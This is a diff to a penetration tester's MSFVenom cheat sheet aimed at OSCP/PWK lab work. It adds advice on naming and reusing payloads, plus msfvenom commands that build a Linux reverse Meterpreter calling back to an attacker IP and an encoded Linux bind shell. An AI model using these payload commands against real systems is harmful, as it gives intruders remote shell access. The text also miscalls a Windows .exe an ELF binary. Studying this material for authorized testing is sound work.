@@ -1,8 +1,15 @@
 # MSFVenom Cheat Sheet
-This sheet is for all of the use-case scenarios in which I have and will use MSFVenom during a penetration test for generating payloads for systems.
+This sheet is for all of the use-case scenarios in which I have and will use MSFVenom during a penetration test for generating payloads for systems. One ting to note, is that these payloads can be used more than once, obviously. I would recommend not re-generating a payload each time you compromise a service on a target server. Use a naming convention, such as:
+
+`OS`+`TYPE`+`PORT`.extension
+
+For instance, a Linux ELF binary, Bind Shell, Binds to port 4567 would be, `LinBind4567.elf`. Windows ELF binary, Reverse Meterpreter, returns to port 5555 would be, `WinRevMeter5555.exe`. Keep these payloads readily available as tie is of the essence. 
+
+If you are working the Offensive Security PWK labs, make sure that you don't use Meterpreter when possible as they do not condone it and it is not allowed in the exam. Hey, if it's confusing - think about it this way, some people still buy vinyl records, I guess nostalgia and doing things by hand is their thing. 
+
 ## WINDOWS
 This section is for all Windows binary creation techniques used with MSFVenom
-### Reverse Meterpreter
+### Meterpreter Reverse
 To make the victim server or system connect back to the attacker and send meterpreter to be spawned by the handler running on the attacker machine.
 1. Generate the MSFVenom Reverse Meterpreter payload:
 
@@ -10,8 +17,10 @@ To make the victim server or system connect back to the attacker and send meterp
 
 ## LINUX
 This section is for all LINUX binary creation techniques used with MSFVenom
-
+### Meterpreter Reverse
 `./msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=(ATTACKER IP) LPORT=5555 -a x86 --platform=linux -f elf -b '\x00' -o shell.o`
+### Bind Shell Port 4567
+`./msfvenom --platform=linux --payload=linux/x86/shell_bind_tcp -e x86/shikata_ga_nai -b '\x00' -f elf LPORT=4567 > LinBind4567.elf`
 
 ## JAVA TOMCAT
 ### .WAR File
